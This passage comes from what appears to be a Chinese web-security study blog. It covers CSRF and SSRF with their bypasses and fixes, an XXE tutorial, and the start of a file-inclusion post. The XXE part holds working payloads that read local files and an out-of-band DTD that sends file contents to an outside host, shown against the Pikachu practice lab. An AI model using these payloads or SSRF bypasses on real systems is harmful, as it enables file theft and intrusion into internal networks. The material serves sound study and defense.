class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs">以你的名义：<br>发邮件<br>发消息<br>财产操作比如转账或者购买商品<br>新建文件<br>增删改查的操作也可以做等等<br></code></pre></td></tr></table></figure><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>CSRF利用前提</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">1.登录信任网站，并在浏览器中保存相应的cookie<br>2.在不退出登录的情况下，访问恶意网站<br></code></pre></td></tr></table></figure><h4 id="分类与利用-GET-CSRF-和-POST-CSRF"><a href="#分类与利用-GET-CSRF-和-POST-CSRF" class="headerlink" title="分类与利用    GET CSRF 和 POST CSRF"></a>分类与利用    GET CSRF 和 POST CSRF</h4><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata">对于很多网站来说，即使是一些重要的操作使用<span class="hljs-keyword">POST</span>来提交请求，但是服务器再接收请求的时候并没有严格区分<span class="hljs-keyword">POST</span>和GET。在PHP中滥用<span class="hljs-variable">$_REQUEST</span>就是例子。<br>如果服务端已经区分了GET,<span class="hljs-keyword">POST</span>只用<span class="hljs-keyword">POST</span>请求数据，可以通过制造一个隐藏的表单，并通过js代码自动提交伪造的表单。<br></code></pre></td></tr></table></figure><h4 id="CSRF漏洞挖掘"><a href="#CSRF漏洞挖掘" class="headerlink" title="CSRF漏洞挖掘"></a>CSRF漏洞挖掘</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span>）冒充身份:订阅<span class="hljs-regexp">/关注/</span>转发/投票操作，删除文件，更改配置等<br><span class="hljs-number">2</span>）帐户接管:密码修改，邮箱绑定，第三方帐户关联<br><span class="hljs-number">3</span>）其他:登录<span class="hljs-regexp">/注册/</span>注销/注册<br><span class="hljs-number">4</span>）安全设计原则:CSRF登录后令牌未更新、登出后未注销等<br></code></pre></td></tr></table></figure><h4 id="CSRF漏洞防御"><a href="#CSRF漏洞防御" class="headerlink" title="CSRF漏洞防御"></a>CSRF漏洞防御</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">从漏洞原理来看：<br><span class="hljs-number">1</span>.关键操作增加验证码机制(比如说支付密码)(增加带有大量噪点的验证码，杜绝代码能够识别的简单验证码，当然了也经常被绕过)<br><span class="hljs-number">2</span>.验证<span class="hljs-built_in">referer</span>(采用同源策略,referer记录着数据包的来源地址,来判断请求的合法性,但是这个可以伪造)<br><span class="hljs-number">3</span>.使用<span class="hljs-built_in">Token</span>(每次访问都会改变)(令牌是一种将表单value的加密算法生成不同的加密结果,在服务器端进行验证)<br><br>从漏洞利用前提条件来看：<br>用户需要养成访问完一个网站之后，点击退出帐户的好习惯<br>（如果用户换浏览器登录则无法继续CSRF漏洞, 因为cookie只存在登录的那个浏览器）<br></code></pre></td></tr></table></figure><h2 id="SSRF："><a href="#SSRF：" class="headerlink" title="SSRF："></a>SSRF：</h2><p>SSRF,也就是Server Side RequestForgery—服务器端请求伪造。</p><h4 id="概念-1"><a href="#概念-1" class="headerlink" title="概念"></a>概念</h4><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">从字面上来看，与CSRF不同的是，它是服务器端发出的请求伪造而非从用户一端提交。别误会，作为受信任用户，服务器当然不可能做出损害用户信息的事。它是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞。因为它是由服务端发起的，所以它能够请求到与它相连但与外网隔离的内部系统。由于服务端提供了从其他服务器应用获取数据的功能（例如分享等功能)且没有对目标地址做过滤与限制，给予了攻击者乘虚而入的机会。比如从指定<span class="hljs-built_in">URL</span>地址获取网页文本内容、加载指定地址的图片、下载等等。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。<br></code></pre></td></tr></table></figure><h4 id="SSRF能做的事情"><a href="#SSRF能做的事情" class="headerlink" title="SSRF能做的事情"></a>SSRF能做的事情</h4><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript">可以对外网服务器所在的内网、本地进行端口扫描，获取一些服务的banner信息。<br>攻击运行在内网或者本地的应用程序。<br>对内网web应用进行指纹识别，通过访问默认文件实现。<br>攻击内外网的web应用。sql注入、struct2、redis等。<br>利用<span class="hljs-built_in">file</span>协议读取本地文件等。<br></code></pre></td></tr></table></figure><h4 id="SSRF常见限制"><a href="#SSRF常见限制" class="headerlink" title="SSRF常见限制"></a>SSRF常见限制</h4><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-number">1.</span>限制为http:<span class="hljs-comment">//www.xxx.com域名</span><br>采用http基本身份认证的方式绕过。即@<br>http:<span class="hljs-comment">//www.xXX.com@www.XXC.com</span><br><span class="hljs-number">2.</span>限制请求IP不为内网地址<br>当不允许ip为内网地址时<span class="hljs-comment">(1)</span>采取短网址绕过<span class="hljs-comment">(2)</span>采取特殊域名<span class="hljs-comment">(3)</span>采取进制转换<br><span class="hljs-number">3.</span>限制请求只为http协议<span class="hljs-comment">(1)</span>采取<span class="hljs-number">302</span>跳转   <span class="hljs-comment">(2)</span>采取短地址<br></code></pre></td></tr></table></figure><h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式:"></a>绕过方式:</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">限制前缀@  <br>限制IP地址句号  <br>限制网址www<span class="hljs-selector-class">.localhost</span>.com/使用 短链接(<span class="hljs-built_in">curl</span>(暂不能用)  file_get_contents)    <br>特殊网址绕过sslip.io和nip<span class="hljs-selector-class">.io</span>    <br>IP的进制转换十进制十六进制<br></code></pre></td></tr></table></figure><h4 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h4><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-number">1</span>.过滤返回信息，如果web应用数去获取某一类型文件，在把结果返回给用户之前先验证信息是否符合标准。<br>例如:当攻击者利用<span class="hljs-string">&quot;识别图片&quot;</span>下的该漏洞远程包含一个文件，可以通过在服务器上验证返回数据是否是纯像素，来进行过滤。<br><span class="hljs-number">2</span>.统一错误页<br><span class="hljs-number">3</span>.限制请求端口为http常用端口<span class="hljs-number">80</span>,<span class="hljs-number">443</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">8090</span><br><span class="hljs-number">4</span>.内网<span class="hljs-built_in">IP</span>黑名单，避免应用被用来获取内网数据，攻击内网<br></code></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>总的来说，CSRF是服务器端没有对用户提交的数据进行严格的把控，导致攻击者可以利用用户的Cookie信息伪造用户请求发送至服务器。而SSRF是服务器对用户提供的可控URL地址过于信任，没有经过严格检测，导致攻击者可以以此为跳板攻击内网或其他服务器。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CSRF</tag>
      
      <tag>SSRF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE</title>
    <link href="/2022/10/13/XXE/"/>
    <url>/2022/10/13/XXE/</url>
    
    <content type="html"><![CDATA[<h4 id="XXE是什么"><a href="#XXE是什么" class="headerlink" title="XXE是什么"></a>XXE是什么</h4><p>是做数据传输。</p><span id="more"></span><p>xxe是<strong>xml外部实体注入</strong></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">简单来说，XXE(<span class="hljs-type">XML</span> <span class="hljs-keyword">External</span> Entity Injection)就是<span class="hljs-type">XML</span>外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。<br>例如，如果你当前使用的程序为PHP，则可以将libxml_disable_entity_loader设置为<span class="hljs-keyword">TRUE</span>来禁用外部实体，从而起到防御的目的。<br>XXE漏洞触发的点往往是可以上传<span class="hljs-type">XML</span>文件的位置，没有对上传的<span class="hljs-type">XML</span>文件进行过滤，导致可以上传恶意的<span class="hljs-type">XML</span>文件。<br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">XML被设计用来传输和存储数据<br><span class="hljs-selector-tag">html</span>被设计用来显示数据<br></code></pre></td></tr></table></figure><h5 id="XML基本格式与基本语法"><a href="#XML基本格式与基本语法" class="headerlink" title="XML基本格式与基本语法"></a>XML基本格式与基本语法</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml">所有XML元素都必须有关闭标签<br>XML标签对大小写敏感<br>XML必须正确地嵌套<br>XML文档必须有根元素<br>XML的属性值需加引号<br>可以将多个字符放入&lt;![CDATA[内容]]&gt;进行转义<br></code></pre></td></tr></table></figure><h5 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h5><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-built_in">XML</span>文档有自己的一个格式规范，这个格式规范是由一个叫做DTD(document <span class="hljs-keyword">type</span> definition)的东西控制的。<br>DTD用来为<span class="hljs-built_in">XML</span>文档定义语义约束。可以嵌入在<span class="hljs-built_in">XML</span>文档中(内部声明),也可以独立的放在另外一个单独的文件中(外部引用)。是<span class="hljs-built_in">XML</span>文档中的几条语句,用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml">DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。<br><br>内部声明:<br><span class="hljs-meta">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span>  例: <span class="hljs-meta">&lt;!DOCTYOE <span class="hljs-keyword">test</span> <span class="hljs-keyword">any</span>&gt;</span><br><br>外部声明:<br> <span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;文件名&quot;</span>&gt;</span> 例:<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&#x27;http://www.test.com/evil.dtd&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="XML预定义五个实体引用"><a href="#XML预定义五个实体引用" class="headerlink" title="XML预定义五个实体引用"></a>XML预定义五个实体引用</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;lt;</span><span class="hljs-symbol">&amp;gt;</span><span class="hljs-symbol">&amp;amp;</span><span class="hljs-symbol">&amp;apos;</span><span class="hljs-symbol">&amp;quot;</span><br>&lt;&gt;&amp;&#x27;&quot;<br></code></pre></td></tr></table></figure><h5 id="XML实体"><a href="#XML实体" class="headerlink" title="XML实体"></a>XML实体</h5><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gams">字符实体<br>命名实体<br>外部实体<br>参数实体<br>内部实体<br>普通实体和参数实体都分为内部实体和外部实体两种，外部实体定义需要加上<span class="hljs-keyword">SYSTEM</span>关键字，其内容是URL所指向的外部文件实际的内容。如果不加<span class="hljs-keyword">SYSTEM</span>关键字，则为内部实体，表示实体指代内容为字符串。<br></code></pre></td></tr></table></figure><h5 id="XML外部实体示例"><a href="#XML外部实体示例" class="headerlink" title="XML外部实体示例"></a>XML外部实体示例</h5><h5 id="无回显时使用"><a href="#无回显时使用" class="headerlink" title="无回显时使用"></a>无回显时使用</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml">BP抓包后,修改成POST模式,在后面加上<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/phpStudy/1.txt&quot;</span>&gt;</span> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs mojolicious"><span class="language-xml">文件一:</span><br><span class="language-xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span></span></span><br><span class="hljs-meta"><span class="language-xml">        <span class="hljs-string">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://10.0.0.19/?%file;&#x27;&gt;&quot;</span></span></span><br><span class="hljs-meta"><span class="language-xml">        &gt;</span></span><br><span class="language-xml"></span><span class="language-perl">        %all;</span><span class="language-xml"></span><br><span class="language-xml">        </span><br><span class="language-xml">文件二</span><br><span class="language-xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="language-xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span></span><br><span class="hljs-meta"><span class="language-xml"> <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/Windows/win.ini&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"> <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://www.localhost.com/xxe_file.dtd&quot;</span>&gt;</span></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%dtd;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml"></span></span><span class="language-perl">%send;</span><span class="language-xml"><span class="hljs-meta"></span></span><br><span class="hljs-meta"><span class="language-xml">]&gt;</span></span><br></code></pre></td></tr></table></figure><p>BP中直接显示明文</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/phpStudy/WWW/99.txt&quot;</span>&gt;</span> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br>将99.txt文件内容显示出来<br></code></pre></td></tr></table></figure><h5 id="例题-皮卡丘靶场例题-读config-inc-php文件"><a href="#例题-皮卡丘靶场例题-读config-inc-php文件" class="headerlink" title="例题:皮卡丘靶场例题,读config.inc.php文件"></a>例题:皮卡丘靶场例题,读config.inc.php文件</h5><h5 id="使用php-x2F-x2F-filter-x2F-read来转化"><a href="#使用php-x2F-x2F-filter-x2F-read来转化" class="headerlink" title="使用php:&#x2F;&#x2F;filter&#x2F;read来转化"></a>使用php:&#x2F;&#x2F;filter&#x2F;read来转化</h5><p>有回显(使用base64)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span>  <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///C:/phpStudy/WWW/pikachu-master/inc/config.inc.php&quot;</span>&gt;</span> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><h6 id="有回显-明文"><a href="#有回显-明文" class="headerlink" title="有回显(明文)"></a>有回显(明文)</h6><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span> <br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">creds</span> [  </span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">goodies</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///C:/phpStudy/WWW/pikachu-master/1.txt&quot;</span>&gt;</span> ]&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">creds</span>&gt;</span><span class="hljs-symbol">&amp;goodies;</span><span class="hljs-tag">&lt;/<span class="hljs-name">creds</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="XXE无回显的利用"><a href="#XXE无回显的利用" class="headerlink" title="XXE无回显的利用"></a>XXE无回显的利用</h5><p>发送给漏洞服务器的包(无回显时也可用)</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/vul/xxe/xxe_1.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>www.pikachu.com<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>287<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://www.pikachu.com<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://www.pikachu.com/vul/xxe/xxe_1.php<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>PHPSESSID=38avn1v46f2n43a3qe8hrr5u73<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><br><span class="language-mojolicious"><span class="language-xml">xml=<span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span></span></span><br><span class="language-xml"><span class="language-mojolicious"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious"> <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=file:///C:/phpStudy/WWW/pikachu-master/inc/config.inc.php&quot;</span>&gt;</span></span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious"> <span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">dtd</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://www.localhost.com/xxe_file.dtd&quot;</span>&gt;</span></span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious"></span></span><span class="language-perl">%dtd;</span><span class="language-xml"><span class="hljs-meta"></span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious"></span></span><span class="language-perl">%send;</span><span class="language-xml"><span class="hljs-meta"></span></span></span><br><span class="hljs-meta"><span class="language-xml"><span class="language-mojolicious">]&gt;</span>&amp;submit=%E6%8F%90%E4%BA%A4</span></span><br></code></pre></td></tr></table></figure><h5 id="如何挖掘XXE"><a href="#如何挖掘XXE" class="headerlink" title="如何挖掘XXE"></a>如何挖掘XXE</h5><p>1.手工测试</p><ol><li>有回显XXE:<ol><li>观察请求头Accept字段是否有application&#x2F;xml, text&#x2F;xml等</li><li>提交一个POST请求，请求头加上Content-type:application&#x2F;xml</li><li>提交一个简单的xml测试语句，查看打印结果</li></ol></li><li>无回显XXE<ol><li>提交测试数据</li><li>利用http协议访问攻击主机，然后查看访问日志确定是否存在XXE</li><li>或者利用dnslog，地址: <a href="http://www.dnslog.cnl/">http://www.dnslog.cnl</a></li></ol></li></ol><p>2.代码审计</p><p>3.工具自动化注入</p><h5 id="XXE的防御"><a href="#XXE的防御" class="headerlink" title="XXE的防御"></a>XXE的防御</h5><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">方案一：使用开发语言提供的禁用外部实体的方法<br>PHP<br>libxml<span class="hljs-constructor">_disable_entity_loader(<span class="hljs-params">true</span>)</span>;<br><br>JAVA<br>DocumentBuilderFactory dbf =<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">DocumentBuilderFactory</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Instance()</span>;<br>dbf.set<span class="hljs-constructor">ExpandEntityReferences(<span class="hljs-params">false</span>)</span>;<br><br>Python:<br>from lxml import etree<br>xmlData = etree.parse(xmlSource,etree.<span class="hljs-constructor">XMLParser(<span class="hljs-params">resolve_entities</span>=False)</span>)<br><br>方案二：过滤用户提交的XML数据<br>过滤关键词&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>XXE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件包含</title>
    <link href="/2022/10/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <url>/2022/10/12/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    
    <content type="html"><![CDATA[<p>文件包含，是一个功能。在各种开发语言中都提供了内置的文件包含函数，其可以使开发人员在一个代码文件中直接包含（引入）另外一个代码文件。</p><span id="more"></span><h5 id="文件包含漏洞原理"><a href="#文件包含漏洞原理" class="headerlink" title="文件包含漏洞原理"></a>文件包含漏洞原理</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">文件包含漏洞产生的原因是在通过引入文件时，包含的文件名是用户可控的,由于传入的文件名没有经过合理的校验，或者校验被绕过。<br></code></pre></td></tr></table></figure><h5 id="文件包含漏洞的形成-需要满足两个条件"><a href="#文件包含漏洞的形成-需要满足两个条件" class="headerlink" title="文件包含漏洞的形成,需要满足两个条件"></a>文件包含漏洞的形成,需要满足两个条件</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span><span class="hljs-keyword">include</span>()等函数通过动态变量的方式引入需要包含的文件<br><span class="hljs-number">2.</span>用户能够控制这个动态变量<br></code></pre></td></tr></table></figure><h5 id="PHP中常见包含文件函数"><a href="#PHP中常见包含文件函数" class="headerlink" title="PHP中常见包含文件函数"></a>PHP中常见包含文件函数</h5><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">include_once</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">include</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">require_once</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">file_get_contents</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">fopen</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></table></figure><h5 id="文件包含漏洞的危害"><a href="#文件包含漏洞的危害" class="headerlink" title="文件包含漏洞的危害"></a>文件包含漏洞的危害</h5><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">敏感信息泄露<br>获取<span class="hljs-keyword">shell</span><span class="language-bash"></span><br><span class="language-bash">任意命令执行</span><br></code></pre></td></tr></table></figure><h5 id="require和include两个函数的区别"><a href="#require和include两个函数的区别" class="headerlink" title="require和include两个函数的区别"></a>require和include两个函数的区别</h5><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">include</span>:包含的文件不存在时,程序会继续执行<br><span class="hljs-built_in">require</span>:包含的文件不存在时,程序停止执行<br>(如果出现语法错误，两个不会继续执行，如果是找不到这个文件，<span class="hljs-built_in">include</span>继续执行，<span class="hljs-built_in">require</span>，停止执行)<br></code></pre></td></tr></table></figure><h3 id="文件包含分类"><a href="#文件包含分类" class="headerlink" title="文件包含分类"></a>文件包含分类</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">本地文件包含      fopen<br>远程文件包含<span class="hljs-meta"><span class="hljs-keyword">include</span></span><br></code></pre></td></tr></table></figure><h5 id="本地文件包含利用"><a href="#本地文件包含利用" class="headerlink" 